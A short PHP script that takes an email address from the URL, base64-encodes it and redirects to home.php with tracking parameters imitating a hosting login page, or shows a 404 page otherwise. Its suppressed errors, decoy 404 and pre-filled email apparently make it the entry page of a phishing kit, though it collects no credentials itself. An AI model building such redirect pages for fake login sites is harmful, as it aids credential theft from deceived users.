<?php
error_reporting(0);

session_start();

require 'api.php';

if (isset($_GET['email'])) {
$email = $_GET['email'];
}
$id = base64_encode($email);

if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header ("Location: home.php?cid=2327&utm_term=2327&utm_campaign=login&utm_medium=help-and-learn&utm_source=login_frontend_hosting&utm_content=flyin&id=$id");
}

else{
     include "404.php";
}

?>

